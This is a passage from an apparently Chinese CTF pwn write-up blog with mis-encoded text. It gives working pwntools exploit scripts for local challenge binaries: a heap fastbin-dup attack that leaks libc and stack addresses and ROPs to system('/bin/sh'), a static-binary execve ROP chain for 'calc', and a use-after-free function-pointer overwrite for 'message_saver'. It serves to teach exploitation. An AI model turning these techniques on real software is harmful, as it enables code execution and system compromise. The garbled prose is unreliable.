PREV_INUSE</span><br><span class="line">0x1c8e120 SIZE=0x30 DATA[0x1c8e130] |have a good command of web and c| INUSED PREV_INUSE</span><br><span class="line">0x1c8e150 SIZE=0x40 DATA[0x1c8e160] |........veritas501..............| INUSED PREV_INUSE</span><br><span class="line">0x1c8e190 SIZE=0x30 DATA[0x1c8e1a0] |...............................j| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e2a0 SIZE=0x20d60 TOP_CHUNK</span><br></pre></td></tr></table></figure></p><p>ç„¶åæŠŠaaaåˆ æ‰ï¼Œé‚£ä¹ˆç°åœ¨æœ‰ä¸¤ä¸ª0x40çš„fastbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap freed</span><br><span class="line">FASTBINS:</span><br><span class="line">Fastbin1 : </span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">Fastbin2 : </span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |........aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |........aaa.....................| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨ï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªbbbï¼Œintroå¤§å°ä¸º0x38ï¼Œå°±æ˜¯è·Ÿç»“æ„ä½“çš„å¤§å°ä¸€è‡´ï¼Œç›®çš„æ˜¯ä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¹‹å‰freedçš„ä¸¤ä¸ª0x40å¤§å°fastbinè¢«åˆ©ç”¨äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xc6e1c0 SIZE=0x40 DATA[0xc6e1d0] |........puts....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e200 SIZE=0x30 DATA[0xc6e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0xc6e230 SIZE=0x40 DATA[0xc6e240] |........bbb.....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e270 SIZE=0x30 DATA[0xc6e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>çœ‹çœ‹hack_listçš„å†…å®¹ï¼Œç¬¬5ä¸ªæŒ‡é’ˆæ˜¯æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„putsï¼Œæ­¤æ—¶show putsçš„èµ„æ–™ï¼Œå°±èƒ½æŠŠputså‡½æ•°çš„åœ°å€æ³„éœ²å‡ºæ¥ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6020c0</span><br><span class="line">0x6020c0: 0x0000000000c6e010  0x0000000000c6e080</span><br><span class="line">0x6020d0: 0x0000000000c6e0f0  0x0000000000c6e160</span><br><span class="line">0x6020e0: 0x0000000000c6e1d0  0x0000000000c6e240</span><br></pre></td></tr></table></figure></p><p>stackåœ°å€æ³„éœ²å‚è€ƒï¼š<a href="https://github.com/Naetw/CTF-pwn-tips#leak-stack-address" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips#leak-stack-address</a> ï¼Œé€šè¿‡<code>environ</code>æ¥leakï¼Œstackåç§»å¯ä»¥æœ¬åœ°è°ƒè¯•è®¡ç®—ã€‚</p><p>ç”±äºå¼€äº†canaryï¼Œé€šè¿‡fastbinä»»æ„åœ°å€å†™çš„æ—¶å€™é€‰æ‹©æ²¡æœ‰canaryä¿æŠ¤çš„å‡½æ•°ï¼Œä¾‹å¦‚ç”¨äº†è¯»å–å­—ç¬¦ä¸²çš„read_Strï¼Œé€šè¿‡ä¿®æ”¹retæ¥getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,intro)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">  p.sendlineafter(<span class="string">'age:'</span>,str(age))</span><br><span class="line">  p.sendlineafter(<span class="string">':'</span>,str(len(intro)))</span><br><span class="line">  p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">  p.send(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name) </span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'ccc'</span>)</span><br><span class="line"><span class="comment">#payload = p64(444)+'environ'.ljust(0x20,'\0')+p64(444)+p64(libc.address+0x3c92f8) # libc_argv</span></span><br><span class="line">payload = p64(<span class="number">444</span>)+<span class="string">'environ'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">444</span>)+p64(libc.symbols[<span class="string">'environ'</span>]) <span class="comment"># libc_env</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'ddd'</span>,<span class="number">444</span>,payload)</span><br><span class="line">show(<span class="string">'environ'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]environ addr :'</span>,hex(environ_addr)</span><br><span class="line">stack_off = <span class="number">0xf8</span></span><br><span class="line">stack_addr = environ_addr<span class="comment">#-0xf8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">pr = <span class="number">0x401053</span> <span class="comment"># pop rdi , ret</span></span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'B'</span>,<span class="number">2</span>,<span class="string">'B'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A</span></span><br><span class="line">add(<span class="string">'C'</span>,<span class="number">3</span>,<span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="string">'C'</span>)  <span class="comment"># C</span></span><br><span class="line">delete(<span class="string">'B'</span>)  <span class="comment"># B-&gt;C</span></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A==C-&gt;B-&gt;C</span></span><br><span class="line"></span><br><span class="line">offset1_argv = <span class="number">0x13b</span></span><br><span class="line">offset_env = <span class="number">0x13b</span>+<span class="number">16</span></span><br><span class="line">payload = p64(stack_addr-offset_env).ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>) <span class="comment">#read_str stack</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,payload)  <span class="comment">#A</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#B</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#C</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0xb</span> + p64(pr) + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="string">'G'</span>,<span class="number">6</span>,payload.ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>)) <span class="comment">#stack</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>è¿™æ¡é¢˜è·Ÿä¹‹å‰æ¹–æ¹˜æ¯çš„ä¸€é¢˜å¾ˆæƒ³ï¼Œæ€è·¯ä¹Ÿæ˜¯ä¸€æ ·ï¼Œç¨‹åºé™æ€ç¼–è¯‘ï¼Œç›´æ¥ç»„ROPchainå°±å¥½äº†ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">64</span>]; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to my calculator (alpha version)"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( read_int_3() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3 = add_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3 = sub_804894E();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = mul_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3 = div_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v1[v2] = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result %d save success!!\n"</span>, v1[v2++]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ä¼šè¦†ç›–åˆ°v2çš„<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">''</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'/bin'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'//sh'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(x)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'a:'</span>,<span class="string">'0'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'b:'</span>,str(x))</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">69</span>):</span><br><span class="line">  add_save(i)</span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop)/<span class="number">4</span>):</span><br><span class="line">  add_save(u32(rop[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h3><p>æç¤ºæ˜¯UAFï¼Œç¨‹åºmessageç»“æ„ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th>content</th><th>size</th></tr></thead><tbody><tr><td>message size</td><td>8byte</td></tr><tr><td>message addr</td><td>8byte</td></tr><tr><td>encoder</td><td>8byte</td></tr></tbody></table><p>æ€è·¯æ˜¯ï¼šå¢åŠ ä¸€æ¡messageï¼Œç„¶ååˆ æ‰ï¼ˆä½†æŒ‡é’ˆæ²¡æ¸…ç©ºï¼‰ï¼Œæ­¤æ—¶ä»ç„¶å¯ä»¥ç¼–è¾‘ï¼Œç¼–è¾‘ä¸€ä¸ª0x18å¤§å°çš„messageï¼Œencoderä¿®æ”¹ä¸ºç¨‹åºç•™çš„åé—¨ï¼ˆå¦‚æœæ²¡æœ‰å°±æ³„éœ²libcåœ°å€ï¼‰ï¼Œç„¶åshowçš„æ—¶å€™å°±ä¼šæ‰§è¡Œencoderä½ç½®çš„å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./message_saver'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len, con, encoder=<span class="number">1</span>)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line">  p.sendlineafter(<span class="string">'===========\n'</span>,str(encoder))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(len, con)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x400816</span>)</span><br><span class="line">edit(<span class="number">0x18</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ascii-art-maker"><a href="#ascii-art-maker" class="headerlink" title="ascii_art_maker"></a>ascii_art_maker</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  sub_4006D6();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input the string you want to convert:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">    sub_400705(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span 